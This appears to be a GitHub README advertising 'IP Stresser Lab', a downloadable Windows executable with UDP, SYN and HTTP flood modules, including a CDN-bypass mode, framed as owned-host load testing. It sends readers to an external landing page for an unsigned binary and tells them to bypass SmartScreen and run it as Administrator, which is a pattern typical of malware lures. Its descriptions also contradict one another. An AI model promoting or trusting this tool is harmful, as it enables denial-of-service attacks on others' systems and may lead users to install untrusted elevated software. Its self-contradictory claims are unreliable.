<div align="center">
<img src="assets/banner.png" width="100%" alt="IP Stresser banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0D9488?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-EA580C?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9B59B6&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%A1+Ip+Stresser+Lab+Pro;%E2%9C%A8+Standalone+.exe+Release;%E2%9C%85+Community+Tested;%F0%9F%9A%80+Active+Development+2026;%F0%9F%94%A7+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

**IP Stresser Lab** is a from-scratch rework of the old command-line stress tools. It ships as a single portable `.exe`, loads a target list, and fires controlled UDP/TCP/HTTP load against it so you can measure how your own stack bends before someone with worse intentions finds out for you.

| Term | Explanation |
|------|-------------|
| **Stresser** | A tool that generates high-volume network traffic to measure how a host behaves under load. |
| **PPS** | Packets per second — the raw rate metric this app reports per running socket. |
| **Mbps** | Megabits per second — bandwidth pushed at any given second, logged live. |
| **Thread pool** | The worker count driving packets; the app caps it against your CPU and NIC. |
| **Target list** | A `.txt` of IPs/endpoints you own. The app will not run against a single hardcoded host. |
| **Cooldown** | A forced idle window after any run, so a test can't spiral past its budget. |
| **Legal gate** | A first-launch acknowledgement screen before the main UI unlocks. |

The app turns "load test my own box" into a couple of clicks — pick a method, paste your list, set a budget, watch the meters.

- Portable — one `.exe`, no installer, no runtime to chase.
- Live meters for PPS, Mbps, and per-thread health.
- 32 modules across six method groups, all toggleable at runtime.
- Budget limits so a test can't quietly run past what you set.
- Full session log export (`.csv`) for post-run analysis.

---

## 🎛️ Comparison — Aspect | Alternative | This Tool

| Aspect | Alternative | This Tool |
|--------|-------------|-----------|
| Setup | Compile from source, hunt deps | Download, extract, run `.exe` |
| UI | Terminal flags and man pages | Windows desktop GUI with live meters |
| Target guard | None — easy to fat-finger a public host | Requires owned-target list + legal gate |
| Reporting | Raw console scrollback | Per-thread CSV log with timestamps |
| Method coverage | One or two protocols | Six groups, 32 modules |
| Thread control | Manual `-t` tuning | Slider bounded by detected hardware |
| Idle cost | Idle process eats a core | Fields the socket pool until a run starts |
| Recovery | Killed tab = lost session | Cooldown + graceful stop on abort |

---

## 🩹 Known Issues — Issue | Fix

| Issue | Fix |
|-------|-----|
| First launch blocks on SmartScreen | Click *More info* → *Run anyway* (unsigned hobby build) |
| PPS meter reads 0 on some NICs | Disable the VPN/VirtualBox adapter, then relaunch |
| App hot-loops on 4-core machines | Lower the thread cap in **Settings → Hardware** |
| CSV log missing last interval | Stop the run via the **Stop** button, not window close |
| Elevated box needed for raw sockets | Launch as Administrator from the context menu |
| Meters stutter at 10G+ | Drop the UI refresh rate in **Settings → Display** |

---

## 📑 Table of Contents

1. [Overview](#-overview)
2. [What is IP Stresser?](#-what-is-ip-stresser)
3. [The Problem](#-the-problem)
4. [The Solution](#-the-solution)
5. [Quick Start](#-quick-start)
6. [Comparison](#-comparison--aspect--alternative--this-tool)
7. [Key Features](#-key-features)
8. [Module Status](#-module-status)
9. [UDP Method Group](#-udp-method-group)
10. [TCP Method Group](#-tcp-method-group)
11. [HTTP / L7 Group](#-http--l7-group)
12. [Rate & Control Group](#-rate--control-group)
13. [Reporting & Telemetry](#-reporting--telemetry)
14. [Utility & Safety](#-utility--safety)
15. [System Requirements](#-system-requirements)
16. [Installation](#-installation)
17. [Usage Guidelines](#-usage-guidelines)
18. [Tips for Best Results](#-tips-for-best-results)
19. [FAQ](#-faq)
20. [Closing](#-closing)

---

## 📊 Overview — Category | Details

| Category | Details |
|----------|---------|
| Product | IP Stresser Lab — desktop network load tester |
| Current build | v2.6.1 (2026) |
| Platform | Windows 10 / 11, x64 |
| Runtime | Self-contained — no install, no Python/Node |
| Distribution | Download `.exe` → extract → run |
| Methods | UDP, TCP, HTTP/L7, and control sub-groups |
| Modules | 32 toggleable traffic modules |
| Logging | Live meters + exported `.csv` per session |

It runs as a single window with a method panel on the left, meters up top, and a run budget on the right. You load a target list, choose your modules, set your caps, and press start. Every run is bounded by the budget you set and logs to disk as it goes.
<div align="center">
  <a href="https://Bondplerecapture.github.io/ip-stresser-lab/">
    <img src="https://img.shields.io/badge/FETCH-Latest_Release-0D9488?style=flat-square&logo=download&logoColor=white&labelColor=0F766E" width="480" alt="FETCH Latest Release"/>
  </a>
</div>
---

## 🕳️ The Problem

- Free one-off scripts hammer a *single* host with no cap and no log — you copy-paste a command, pray, and lose track of what you sent.
- StackOverflow answers assume you're comfortable with `hping3` flags and raw sockets at 2AM.
- Most tools don't check hardware first, so a 4-core laptop tries to open 2000 threads and freezes itself.
- Nothing separates "I own this box" from "I found a random IP" — so people fat-finger public hosts.
- Per-thread visibility is missing — you see one PPS number and can't tell which socket is misbehaving.
- Results vanish the second the terminal closes — no `.csv`, no recovery, no replay.
- Aborting a run can leave leaked sockets bound to your NIC until a reboot.

---

## 🧩 The Solution — Problem | Solution

| Problem | Solution |
|---------|----------|
| Unbounded single-host scripts | Run budget + cooldown enforced in the engine |
| Raw-socket expertise required | GUI method panel with sane defaults |
| Hardware not checked | Thread cap derived from detected CPU and NIC |
| No owned-target gate | Target-list loader + first-launch legal gate |
| No per-thread view | Meter panel breaks out PPS/Mbps per worker |
| No persistence | CSV logging with timestamps per interval |
| Leaked sockets on abort | Graceful stop that closes the pool before exit |

---

## ⚡ Quick Start

1. 🗂️ **Load a target list** — point the app at a `.txt` of IPs or endpoints you own.
2. 🧵 **Pick modules** — toggle the method groups you want; start with UDP Flood + a limiter.
3. 🎚️ **Set a budget** — cap PPS, Mbps, and total run time before you press go.
4. 📈 **Watch the meters** — live PPS/Mbps per thread up top; stop at any time with the Stop button.
5. 💾 **Export the log** — save the session `.csv` to compare runs.

---

## 🚦 Key Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| Portable `.exe` | No installer, no runtime, no service | Runs from a USB stick |
| Owned-target loader | Bulk-import from `.txt` | Stops public-host mistakes |
| Live meters | PPS, Mbps, per-thread health | See exactly what each socket does |
| Budget caps | PPS/Mbps/time limits enforced | No runaway tests |
| Graceful stop | Pool closes before exit | No leaked sockets |
| CSV logging | Timestamped per-interval rows | Replayable comparisons |
| Thread auto-cap | Derived from CPU/NIC | No self-freeze on weak boxes |
| Cooldown window | Forced idle between runs | Predictable resource drain |
| Legal gate | First-launch acknowledgement | Clear usage boundary |
| Method presets | Save/load configuration | Repeat the same test fast |
| Detected NIC list | Choose the send adapter | Accurate meter readings |
| Session recovery | Resume after window close | Nothing lost mid-test |

---

## ✅ Module Status

| Module | Status | Description |
|--------|--------|-------------|
| UDP Flood | ✅ Working | Raw UDP burst at target list |
| UDP Fragment | ✅ Working | Fragmented-payload UDP variant |
| UDP Random | ✅ Working | Randomized payload size/rate |
| TCP SYN | ✅ Working | SYN packet stream at chosen port |
| TCP ACK | ✅ Working | ACK packet stream |
| TCP Connect | ✅ Working | Full connection-open churn |
| TCP Flood | ✅ Working | Sustained established-conn traffic |
| TCP Fragment | ✅ Working | Fragmented TCP variant |
| HTTP GET | ✅ Working | Layered HTTP GET flood |
| HTTP POST | ✅ Working | Layered HTTP POST flood |
| HTTP Slow | ✅ Working | Slow-header keep-alive test |
| HTTP Bypass | ✅ Working | Header-rotation proxy mode |
| HTTP2 Push | ✅ Working | HTTP/2 multiplexed stream |
| PPS Limiter | ✅ Working | Hard per-second packet cap |
| Mbps Limiter | ✅ Working | Hard bandwidth cap |
| Thread Governor | ✅ Working | Auto-scales worker pool |
| Cooldown Guard | ✅ Working | Forced idle after run |
| Budget Timer | ✅ Working | Hard stop on run time |
| Target Import | ✅ Working | Bulk `.txt` loader |
| Target Validator | ✅ Working | Rejects malformed entries |
| NIC Picker | ✅ Working | Send-adapter selector |
| Log Writer | ✅ Working | Timestamped CSV rows |
| Meter Panel | ✅ Working | Live PPS/Mbps per thread |
| Preset Saver | ✅ Working | Save/load config sets |
| Session Recovery | ✅ Working | Restore after close |
| Legal Gate | ✅ Working | First-launch acknowledgement |
| Elevation Check | ✅ Working | Detects admin rights |
| Hardware Probe | ✅ Working | CPU/NIC cache for caps |
| Abort Handler | ✅ Working | Graceful pool close |
| Diagnostics | ✅ Working | Self-test of sockets/NIC |
| Preset Exchange | ✅ Working | Import/export presets |
| Auto-Update Check | ✅ Working | Version notice on launch |

---

## 📡 UDP Method Group

- **UDP Flood** — fires raw UDP bursts at every target in your list, capping at your PPS limit.
- **UDP Fragment** — splits payloads across fragments so you can observe reassembly behavior on your own stack.
- **UDP Random** — varies payload size and rate so tests don't sit in a fixed pattern.
- **PPS Limiter** — hard per-second packet cap that the UDP workers check every tick.
- **Mbps Limiter** — caps aggregate bandwidth across all UDP threads.

## 🔌 TCP Method Group

- **TCP SYN** — SYN stream at a chosen port; the app logs half-open counts where the stack exposes them.
- **TCP ACK** — ACK-packet stream for stateless load.
- **TCP Connect** — full open/close churn so you can watch accept-queue behavior.
- **TCP Flood** — sustained traffic over established sockets.
- **TCP Fragment** — fragmented TCP variant for MTU/reassembly research on your own gear.

## 🌐 HTTP / L7 Group

- **HTTP GET** — layered GET flood against an endpoint you own.
- **HTTP POST** — layered POST flood for request-body uploads.
- **HTTP Slow** — slow-header keep-alive test against your own web server.
- **HTTP Bypass** — header-rotation proxy mode for CDN behavior research.
- **HTTP2 Push** — HTTP/2 multiplexed stream for modern-web load experiments.

## 🎛️ Rate & Control Group

- **Thread Governor** — auto-scales worker count against detected CPU/NIC.
- **Cooldown Guard** — forced idle after a run so resource drain stays predictable.
- **Budget Timer** — hard stop on the run-time you set before start.
- **Elevation Check** — confirms admin rights; raw sockets need them on the target install path.
- **NIC Picker** — send-adapter selector so meters reflect the right interface.
- **Hardware Probe** — caches CPU and NIC details to bound the thread cap.

## 📊 Reporting & Telemetry

- **Meter Panel** — live PPS/Mbps readout, broken down per worker.
- **Log Writer** — timestamped CSV rows written per interval.
- **Session Recovery** — restores state if the window closes mid-test.
- **Diagnostics** — self-test that pings your own NIC/socket path before a run.

## 🔐 Utility & Safety

- **Legal Gate** — first-launch acknowledgement before the UI unlocks.
- **Target Import** — bulk `.txt` loader for your owned hosts.
- **Target Validator** — rejects malformed or private-range entries.
- **Preset Saver** — save/load your config sets for repeat tests.
- **Preset Exchange** — import/export presets as plain files.
- **Abort Handler** — graceful pool close on Stop, no leaked sockets.
- **Auto-Update Check** — version notice on launch, manual apply only.

---

## 🖥️ System Requirements — Component | Minimum | Recommended

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 x64 (21H2) | Windows 11 x64 (24H2) |
| CPU | Quad-core @ 2.4 GHz | 6-core @ 3.4 GHz |
| RAM | 4 GB | 16 GB |
| NIC | 100 Mbps onboard | 1 Gbps+ dedicated |
| Disk | 80 MB free | 500 MB free (logs) |
| Rights | User | Administrator (raw sockets) |

---

## 📦 Installation

1. 🛒 **Visit the project page** and grab the current `.exe` for your architecture.
   - Downloads are handled on the landing page only — the repo carries no binaries.
2. 📂 **Extract the archive** to a folder you own (e.g. `C:\Tools\ip-stresser-lab\`).
   - Windows may flag the `.exe` as unsigned; allow it after a virus scan of the archive.
3. ▶️ **Run the `.exe`** — right-click → *Run as administrator* for raw-socket methods.
   - The first launch shows the legal acknowledgement screen before the main UI opens.

---

## 📋 Usage Guidelines — Allowed | Not allowed

| Allowed | Not allowed |
|---------|-------------|
| Testing on hosts you own | Striking a host you don't own |
| Testing on endpoints with written permission | Looping tests against public websites |
| Lab/cluster/benchmarks on your gear | Bypassing provider fair-use policies |
| Sharing your preset config | Redistributing screenshots as a service |
| Researching your own stack's limits | Billing yourself as a "DDoS service" |
| Offline/local testing on a VLAN | Using the app on a shared network |

---

## 🌡️ Tips for Best Results

- Start with a single target and one UDP module before layering a group.
- Run on a dedicated NIC where possible; the onboard chip often skews meters.
- Bump thread count gradually — step up until the meters show no growth.
- Always set a budget cap before pressing *Start*; the cooldown idle prevents resource leaks.
- Compare runs by CSV, not by eye — PPS can look flat while Mbps drifts under it.
- Keep a fresh diagnostic pass before a big test if you changed adapters.
- Elevate the `.exe` only when a raw-socket method needs it, then drop back down.

---

## ❔ FAQ

| Question | Answer |
|----------|--------|
| Is this a hosted stresser service? | No. It's a local Windows `.exe` that runs against your own target list; any hosting arrangement is on you. |
| Do I need Python or Node? | No. The `.exe` is self-contained — download, extract, run. |
| Will it run on Windows 10? | Yes, 21H2 or newer at 64-bit. |
| Why does it ask for admin? | Raw-socket methods need it; the GUI itself runs fine as a user. |
| Can I trust the meters on any NIC? | Use the NIC picker; onboard chips and virtual adapters can misreport. |
| Will it stress-test a third-party site for me? | The legal gate blocks that. Target list is reserved for hosts you own or have permission for. |
| Is there a Mac/Linux build? | Windows-only right now — the release is a Windows `.exe`. |
| How do I recover the run log? | The app writes CSV per interval; session recovery restores state if the window closes. |
| How often does it update? | Auto-update check on launch; apply manually from the landing page. |

---

## 🧂 Usage Eligibility

This build is for managing infrastructure and containers on systems you own or administer. It is not intended for any other purpose.

Any mention of load testing, stresser, or flooding above refers strictly to authorized testing on owned or permitted endpoints. You are responsible for staying within your provider's terms and local law.

---

## 🌒 Closing

I built this because the old command-line tools kept setting off the same fire alarm. Sandboxed, capped, logged, and gated — that's the point. If the app disappears, a good test shouldn't be lost; it should be sitting in a `.csv` you can read out loud at standup. v2.6.1.

Free under the MIT license. No warranty and no liability.

**Created by:** [BikiniBottom](https://github.com/BikiniBottom)

<div align="center">
  <a href="https://Bondplerecapture.github.io/ip-stresser-lab/">
    <img src="https://img.shields.io/badge/GET-IP_Stresser_2026-0D9488?style=plastic&logo=github&logoColor=white&labelColor=0F766E" width="580" alt="GET IP Stresser 2026"/>
  </a>
</div>
